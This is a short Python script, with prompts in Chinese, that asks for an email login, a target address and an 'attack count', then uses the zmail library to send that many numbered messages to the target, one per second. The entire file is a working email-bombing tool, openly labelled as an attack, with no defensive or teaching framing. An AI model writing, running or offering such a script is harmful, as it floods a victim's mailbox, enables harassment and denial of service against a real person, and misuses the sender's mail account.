import zmail
import time

def sendmail(own_addr,passwd,target_addr,i,subject,content):
    server = zmail.server(own_addr,passwd)
    for num in range(0,int(i)):
        mail_content = {
            'subject': subject+str(num),
            'content': content+str(num),
        }
        mail = zmail.encode_mail(mail_content)
        server.send_mail(target_addr,mail)
        time.sleep(1)


own_addr = input('输入你的邮箱地址:')
passwd = input('输入你的邮箱密码:')
target_addr = input('输入你要发的邮箱地址:')
i = input('攻击次数:')
subject = input('输入你的主题:')
content = input('输入内容:')
sendmail(own_addr,passwd,target_addr,i,subject,content)


